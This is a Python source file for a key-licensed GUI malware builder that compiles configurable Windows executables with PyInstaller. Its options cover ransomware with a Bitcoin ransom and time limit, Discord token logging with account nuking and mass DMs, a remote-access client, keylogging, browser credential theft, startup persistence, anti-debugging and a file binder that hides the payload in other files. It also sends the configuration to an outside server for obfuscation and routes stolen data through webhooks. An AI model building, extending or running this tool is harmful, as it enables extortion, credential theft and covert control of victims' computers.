from tkinter import *
from PIL import Image
from colorama import Style, Fore
from tkinter import filedialog as fd
from bit import SUPPORTED_CURRENCIES
from cryptography.fernet import Fernet
import customtkinter, subprocess, Cryptodome, websocket, threading, coincurve, requests, tkinter, shutil, base64, fade, time, bit, os

customtkinter.set_appearance_mode("dark")


class ScrollableFrame(customtkinter.CTkScrollableFrame):
    def __init__(self, master, widgets, row=0, column=0, rowspan=0, columnspan=0, padx=20, pady=20, scrollable=False):
        super().__init__(master)

        self.grid(row=row, column=column, columnspan=columnspan, rowspan=rowspan, padx=padx, pady=padx, sticky="nsew")

        for i in range(7): # Set 7 rows
            self.rowconfigure(i, weight= 1)
        
        for i in range(7): # Set 6 columns
            self.columnconfigure(i, weight= 1)

        self.row = 2
        self.filenames = []

        for count, (title, data) in enumerate(widgets.items()):
            widget = customtkinter.CTkButton(master=self, text=title, command=lambda: self.file_prompt())
            widget.grid(row=0, column=3, sticky="nsew")

            widgets[title] = self

    def remove(self, target, filename):
        self.filenames.remove(filename)
        for count, widget in enumerate(self.winfo_children()):
            if widget is target:
                widget.destroy()

    def file_prompt(self):
        filetypes = (
            ('All files', '*'),
        )

        filename = fd.askopenfilename(
            title='Open a file',
            initialdir='/',
            filetypes=filetypes)

        if filename:
            widget = customtkinter.CTkCheckBox(master=self, text=filename)
            widget.configure(command=lambda: self.remove(widget, filename))
            widget.configure(variable=tkinter.IntVar(value=1))
            widget.grid(row=self.row, column=3, sticky="nsew")

            self.filenames.append(filename)
            self.row += 1

        

class Frame(customtkinter.CTkFrame):
    def __init__(self, master, widgets, intonly=[], default=[], row=0, column=0, rowspan=0, columnspan=0, padx=20, pady=20, activation_widget=0, scrollable=False):
        super().__init__(master)

        self.grid(row=row, column=column, columnspan=columnspan, rowspan=rowspan, padx=padx, pady=padx, sticky="nsew")

        for i in range(7): # Set 7 rows
            self.rowconfigure(i, weight= 1)
        
        for i in range(6): # Set 6 columns
            self.columnconfigure(i, weight= 1)

        

        for count, (title, widget_type) in enumerate(widgets.items()):
            x = (count // 1) + 1
            y = (count % 1) * 1

            if widget_type is customtkinter.CTkEntry:
                var = tkinter.IntVar(value=0)
                widget = widget_type(master=self, placeholder_text=title)
                if count in intonly:
                    vcmd = (self.register(self.enter_only_digits), '%P', '%d')
                    widget.configure(validate='key', validatecommand=vcmd)

                if count not in default:
                    widget.configure(state="disabled")

            elif widget_type is customtkinter.CTkCheckBox:
                widget = widget_type(master=self, text=title, onvalue=True, offvalue=False)

                if activation_widget == count:
                    activate_widget = widget
                    widget.configure(command=lambda: self.on_click(widgets, default, activate_widget.get()))

            elif widget_type is customtkinter.CTkOptionMenu:
                options = [*dict(SUPPORTED_CURRENCIES).values()]

                var = customtkinter.StringVar(value="United States Dollar")

                widget = widget_type(master=self, values=options, variable=var)
                widget.grid(row=x, column=2, sticky="ew")

                widgets[title] = widget

                continue

            else:
                extension = "ico" if title == "File Icon" else "mp4"

                if extension == "ico":
                    self.icon = tkinter.StringVar(value="")

                else:
                    self.cast_file = tkinter.StringVar(value="")

                widget = widget_type(master=self, text=title, command=lambda: self.file_prompt(extension))
                widget.grid(row=x, column=2, sticky="ew")

                if extension == "ico":
                    widgets[title] = self.icon

                else:
                    widgets[title] = self.cast_file

                continue
                

            widgets[title] = widget
            widget.grid(row=x, column=2, sticky="nsew")

    def enter_only_digits(self, entry, action_type) -> bool:
        if action_type == '1' and not entry.isdigit():
            return False

        return True

    def on_click(self, widgets, default, state):
        for count, widget in enumerate(widgets.values()):
            if count in default:
                continue
            if isinstance(widget, customtkinter.CTkEntry):
                widget.configure(state="disabled" if not state else "normal")

    def file_prompt(self, extension):
        filetypes = (
            (f'{extension.upper()} files', f'*.{extension}'),
        )

        filename = fd.askopenfilename(
            title='Open a file',
            initialdir='/',
            filetypes=filetypes)

        if extension == "ico":
            self.icon.set(filename)

        else:
            self.cast_file.set(filename)

class App(customtkinter.CTk):
    def __init__(self):
        os.system('')
        self.hwid = str(subprocess.check_output('wmic csproduct get uuid'), 'utf-8').split('\n')[1].strip()
        self.banner()

        super().__init__()

        self.geometry("1100x600")

        for i in range(21): # Set 21 rows
            self.rowconfigure(i, weight= 1)
        
        for i in range(18): # Set 18 columns
            self.columnconfigure(i, weight= 1)

        pil_image = Image.open("assets\\Title.png")
        image = customtkinter.CTkImage(dark_image=pil_image, light_image=pil_image, size=(400, 90))

        title = customtkinter.CTkLabel(self, image=image, text="")
        title.grid(row=0, column=0, columnspan=24, sticky="nsew")

        self.get_key()

    def get_key(self):
        key_frame = customtkinter.CTkFrame(self)
        key_frame.grid(row=1, column=0, padx=20, pady=20, sticky="nsew", columnspan=18, rowspan=21)
        
        for i in range(16): # Set 16 rows
            key_frame.rowconfigure(i, weight= 1)
        
        for i in range(16): # Set 16 columns
            key_frame.columnconfigure(i, weight= 1)

        key_entry = customtkinter.CTkEntry(key_frame, placeholder_text='Enter Key')
        key_entry.grid(row=8, column=8, padx=20, pady=20, sticky="nesw")

        response_label = customtkinter.CTkLabel(key_frame, text="")
        response_label.grid(row=9, column=8, columnspan=2, padx=0, pady=20, sticky="nesw")

        submit = customtkinter.CTkButton(key_frame, text='Submit', command=lambda: self.verify_key(key_entry.get(), response_label))
        submit.grid(row=8, column=9, padx=0, pady=20, sticky="nesw")
        submit.grid(row=8, column=9, padx=0, pady=20, sticky="nesw")
    

    def verify_key(self, key, label):
        status_code = requests.get('https://septicx.pythonanywhere.com/api/verify', data={'key':key, 'hwid': self.hwid}).status_code

        if status_code == 200:
            label.configure(text='Success!')
            time.sleep(1)

            self.key = key

            for child in self.winfo_children()[1:]:
                child.destroy()

            self.menu()

        else:
            label.configure(text='Invalid Key')

    def menu(self):
        tabview = customtkinter.CTkTabview(self)
        tabview.add('Configuration')
        tabview.add('File Binder')

        tabview.grid(row=1, column=0, padx=20, pady=20, sticky="nsew", columnspan=18, rowspan=21)

        main_frame = tabview.tab('Configuration')
        binder_frame = tabview.tab('File Binder')

        for i in range(15): # Set 15 rows
            main_frame.rowconfigure(i, weight=1)
        
        for i in range(15): # Set 15 columns
            main_frame.columnconfigure(i, weight=1)

        binder_frame.rowconfigure(0, weight=1)
        binder_frame.columnconfigure(0, weight=1)

        ransomware_widgets = {
            "Ransomware": customtkinter.CTkCheckBox,
            "Reboots Until Run": customtkinter.CTkEntry,
            "Ransom Time Limit (Hours)": customtkinter.CTkEntry,
            "Bitcoin Address": customtkinter.CTkEntry,
            "Ransom Amount": customtkinter.CTkEntry,
            "Currency": customtkinter.CTkOptionMenu
        }
        
        ransom_frame = Frame(master=main_frame, widgets=ransomware_widgets, row=0, column=11, columnspan=3, rowspan=14, pady=0, padx=20, intonly=[1, 2, 4])

        discord_widgets = {
            "Token Logger": customtkinter.CTkCheckBox,
            "Auto Nuke": customtkinter.CTkCheckBox,
            "MassDM": customtkinter.CTkCheckBox,
            "MassDM Script": customtkinter.CTkEntry
        }
        
        discord_frame = Frame(master=main_frame, widgets=discord_widgets, row=0, column=8, columnspan=3, rowspan=14, pady=0, padx=20)

        connection_widgets = {
            "Connect To Server": customtkinter.CTkCheckBox,
            "Dynamic Webhook": customtkinter.CTkCheckBox,
            "Server Address": customtkinter.CTkEntry,
            "Server Password": customtkinter.CTkEntry,
            "Webhook": customtkinter.CTkEntry,
            "Tv Cast File": customtkinter.CTkButton,
        }
        
        connection_frame = Frame(master=main_frame, default=[4], widgets=connection_widgets, row=0, column=5, columnspan=3, rowspan=14, pady=0, padx=20)

        misc_widgets = {
            "Key Logger": customtkinter.CTkCheckBox,
            "Browser Logs": customtkinter.CTkCheckBox,
            "Add To Startup": customtkinter.CTkCheckBox,
            "File Icon": customtkinter.CTkButton,
            "Anti Debug": customtkinter.CTkCheckBox,
            "Run As Admin": customtkinter.CTkCheckBox,
            "Show Console (Debug)": customtkinter.CTkCheckBox
        }
        
        misc_frame = Frame(master=main_frame, widgets=misc_widgets, intonly=[6, 7], default=[6, 7], row=0, column=1, columnspan=3, rowspan=16, pady=0, padx=20, activation_widget=None)

        binder_widgets = {
            "Add File": customtkinter.CTkButton
        }

        binder_frame = ScrollableFrame(master=binder_frame, widgets=binder_widgets, row=0, column=0, columnspan=1, rowspan=1, pady=0, padx=0)

        

        # Compile Buttom
        button = customtkinter.CTkButton(master=main_frame, text="Compile", command=lambda: threading.Thread(target=self.start_compile, args=(ransomware_widgets, discord_widgets, connection_widgets, misc_widgets, binder_widgets)).start())
        button.grid(row=14, column=7, columnspan=2, sticky="ew")

        self.response_label = customtkinter.CTkLabel(master=main_frame, text="", justify='center')
        self.response_label.grid(row=15, column=7, columnspan=2, sticky="ew")

    def start_compile(self, ransomware_config, discord_config, connection_config, misc_config, binder_widgets):
        
        server_addr = ''
        server_key = ''
        wallet = ''
        massdm_script = ''
        cost = 0
        currency = ''
        reboots_allowed = 0
        hours = 0
        webhook = ''
        massdm = False
        auto_nuke = False
        massdm_script = ''
        keylogger = False
        dynamic_webhook = False
        cast_file = 0
        
        ransomware = ransomware_config["Ransomware"].get()
        if ransomware:
            reboots_allowed = ransomware_config['Reboots Until Run'].get()
            hours = ransomware_config['Ransom Time Limit (Hours)'].get()
            wallet = ransomware_config['Bitcoin Address'].get()
            cost = ransomware_config['Ransom Amount'].get()
            currency = ransomware_config['Currency'].get()

            currency = list(SUPPORTED_CURRENCIES)[list(SUPPORTED_CURRENCIES.values()).index(currency)]

        token_logger = discord_config['Token Logger'].get()
        if discord_config:
            massdm = discord_config['MassDM'].get()
            massdm_script = discord_config['MassDM Script'].get()
            auto_nuke = discord_config['Auto Nuke'].get()
        
        rat_client = connection_config['Connect To Server'].get()
        if rat_client:
            server_addr = base64.b64encode(connection_config['Server Address'].get().replace('https://', '').replace('http://', '').replace('wss://', '').replace('ws://', '').split('/')[0].encode()).decode()
            server_key = base64.b64encode(connection_config['Server Password'].get().encode()).decode()
            dynamic_webhook = connection_config['Dynamic Webhook'].get()
            cast_file = connection_config['Tv Cast File'].get()
        else:
            webhook = connection_config['Webhook'].get()

        keylogger = misc_config['Key Logger'].get()
        browser = misc_config['Browser Logs'].get()
        startup = misc_config['Add To Startup'].get()
        icon = misc_config['File Icon'].get()
        debug = misc_config['Anti Debug'].get()
        admin = misc_config['Run As Admin'].get()
        windowed = not misc_config['Show Console (Debug)'].get()

        binder_files = binder_widgets['Add File'].filenames

        self.response_label.configure(text='Compiling To Exe...')

        self.compile([rat_client, server_addr, server_key, dynamic_webhook, webhook, cast_file, ransomware, reboots_allowed, hours, wallet, cost, currency, keylogger, token_logger, massdm, massdm_script, auto_nuke, browser, startup, debug, icon, admin, windowed, binder_files])

    @staticmethod
    def banner():
        print(fade.greenblue("""
   ▄████████    ▄████████    ▄███████▄     ███      ▄█   ▄████████ ▀████    ▐████▀ 
  ███    ███   ███    ███   ███    ███ ▀█████████▄ ███  ███    ███   ███▌   ████▀  
  ███    █▀    ███    █▀    ███    ███    ▀███▀▀██ ███▌ ███    █▀     ███  ▐███    
  ███         ▄███▄▄▄       ███    ███     ███   ▀ ███▌ ███           ▀███▄███▀    
▀███████████ ▀▀███▀▀▀     ▀█████████▀      ███     ███▌ ███           ████▀██▄     
         ███   ███    █▄    ███            ███     ███  ███    █▄    ▐███  ▀███    
   ▄█    ███   ███    ███   ███            ███     ███  ███    ███  ▄███     ███▄  
 ▄████████▀    ██████████  ▄████▀         ▄████▀   █▀   ████████▀  ████       ███▄ 
        """))

    def compile(self, config):
        rat_client, server_addr, server_key, dynamic_webhook, webhook, cast_file, ransomware, reboots_allowed, hours, wallet, cost, currency, keylogger, token_logger, massdm, massdm_script, auto_nuke, browser, startup, debug, icon, admin, windowed, binder_files = config
        key = {
            "SERVER_CLIENT": rat_client,
            "HOSTNAME": f'O0O000OOO00O0OOO0("{server_addr}").decode()',
            "SERVERKEY": f'O0O000OOO00O0OOO0("{server_key}").decode()',
            "KEYLOGGER": keylogger,
            "RANSOMWARE": ransomware,
            "FERNET_KEY": Fernet.generate_key().decode(),
            "REBOOTS_ALLOWED": reboots_allowed,
            "HOURS": hours,
            "CRYPTO_WALLET": wallet,
            "CRYPTO_AMOUNT": cost,
            "CURRENCY": currency,
            "WEBHOOK": f'"https://"+O0O000OOO00O0OOO0("{server_addr}").decode()+"/webhook"' if dynamic_webhook else f'"{webhook}"',
            "TOKEN_LOGGER": token_logger,
            "NUKE_TOKEN": auto_nuke,
            "MASSDM_BOOL": massdm,
            "MASSDM_SCRIPT": massdm_script,
            "BROWSER_LOGGER": browser,
            "ANTI_DEBUG": debug,
            "ADD_TO_STARTUP": startup,
            "ADMIN": admin
        }

        request = requests.get('https://septicx.pythonanywhere.com/api/obfuscate', json={
            "options": {
                "base": 55000,
                "recursion": 2,
                "bytes": True
            },
            "config": key,
            "hwid": self.hwid,
            "key": self.key
            
        }, headers={'content-type':'application/json'})

        if request.status_code != 200:
            self.response_label.configure(text='Error: Webserver failed to compile successfully')
            return

        src = request.content

        dir = os.path.dirname(os.path.realpath(__file__))

        with open('src\\output.py', 'wb') as file:
            file.write(src)

        with open('src\\files\\instructions.txt', 'r+') as file:
            data = file.read()

        with open('src\\temp\\instructions.txt', 'w+') as file:
            file.write(data.replace('WALLET', wallet).replace('AMOUNT', str(cost)).replace('CURRENCY', currency))
        
        binder_args = []

        for path in binder_files:
            filename = path.split("/")[-1]
            shutil.copyfile(path, f'src\\temp\\binder_{filename}')
            binder_args += ['--add-data', f'{dir}\\src\\temp\\binder_{filename};.']

        if cast_file:
            filename = cast_file.split("/")[-1]
            shutil.copyfile(cast_file, f'{dir}\\src\\temp\\cast_{filename}')

        coincurve_path = "\\".join(coincurve.__file__.split("\\")[:-1])
        cryptodome_path = "\\".join(Cryptodome.__file__.split("\\")[:-1])
        bit_path = "\\".join(bit.__file__.split("\\")[:-1])

        default_imports = [
            '--hidden-import','subprocess',
            '--hidden-import','win32file',
            '--hidden-import','pythoncom',
            '--hidden-import','threading',
            '--hidden-import','requests',
            '--hidden-import','winsound', 
            '--hidden-import','win32api',
            '--hidden-import','win32gui', 
            '--hidden-import','win32con',
            '--hidden-import','win32ui', 
            '--hidden-import','marshal',
            '--hidden-import','random',  
            '--hidden-import','winreg',
            '--hidden-import','base64',
            '--hidden-import','psutil',
            '--hidden-import','shutil',
            '--hidden-import','string',
            '--hidden-import','msvcrt', 
            '--hidden-import','ctypes',
            '--hidden-import','scipy',
            '--hidden-import','shlex',
            '--hidden-import','time',
            '--hidden-import','json',
            '--hidden-import','uuid',
            '--hidden-import','math',
            '--hidden-import','mss',
            '--hidden-import','sys',
            '--hidden-import','wmi',
            '--hidden-import','ssl',
            '--hidden-import','re',
            '--hidden-import','io',
            '--hidden-import','os',
        ]

        keylogger_imports = [
            '--hidden-import', 'keyboard', 
            '--hidden-import', 'tkinter'
        ] if keylogger else []

        ransomware_imports = [
            '--hidden-import', 'cryptography.fernet',
            '--hidden-import', 'Cryptodome.Cipher.AES',
            '--hidden-import', 'tkinter', 
            '--hidden-import', 'bit', 
            
        ] if ransomware else []

        server_imports = [
            '--hidden-import', 'discord_webhook', 
            '--hidden-import', 'websocket', 
            '--hidden-import', 'discord',
            '--hidden-import', 'pyaudio',
            '--hidden-import','cv2'
        ] if rat_client else []

        browser_imports = [
            '--hidden-import', 'Cryptodome.Cipher.AES',
            '--hidden-import', 'discord_webhook', 
            '--hidden-import', 'win32crypt', 
            '--hidden-import', 'sqlite3', 
            '--hidden-import', 'zipfile',
            '--hidden-import', 'discord'
        ] if browser else []

        discord_imports = [
            '--hidden-import', 'discord_webhook', 
            '--hidden-import', 'discord'
        ] if token_logger else []

        imports = default_imports + keylogger_imports + ransomware_imports + server_imports + browser_imports + discord_imports

        command = ['python', '-m', 'PyInstaller', '--noconfirm', '--windowed' if windowed else '', '--onefile', '--clean'] + imports + ['--icon', icon if icon else 'NONE', '--upx-dir', 'build\\upx', '--upx-exclude', '_uuid.pyd', '--upx-exclude', 'python3.dll', '--workpath', 'build', '--specpath', 'build\\spec', '--add-data', f'{coincurve_path};coincurve', '--add-data', f'{cryptodome_path};Cryptodome', '--add-data', f'{bit_path};bit', '--add-data', f'{dir}\\src\\temp\\instructions.txt;.', '--add-data', f'{dir}\\src\\files\\wallpaper.jpg;.', '--add-data', f'{dir}\\src\\files\\failed.jpg;.', '--add-data' if cast_file else '', f'{dir}\\src\\temp\\cast_{filename};.' if cast_file else ''] + binder_args + [f'{dir}\\src\\output.py']
        for _ in range(command.count('')):
            command.remove('')
        print(command)

        subprocess.call(command, shell=True)

        if os.path.exists(f"{dir}\\dist\\output.exe"):

            self.response_label.configure(text='EXE in dist folder')
            print(self.color('Your file is in the dist folder named "output.exe"'))

        else:
            self.response_label.configure(text='Failed to compile')
            print(self.color('Failed to compile'))

        for file in os.listdir('src\\temp'):
            os.remove(f'src\\temp\\{file}')
        os.system('PAUSE')

    def color(self, text, color='blue'):
        key = {
            "blue": Fore.CYAN,
            "red": Fore.RED,
            "green": Fore.GREEN
        }

        return key[color] + text + Style.RESET_ALL


if __name__ == "__main__":
    app = App()
    app.mainloop()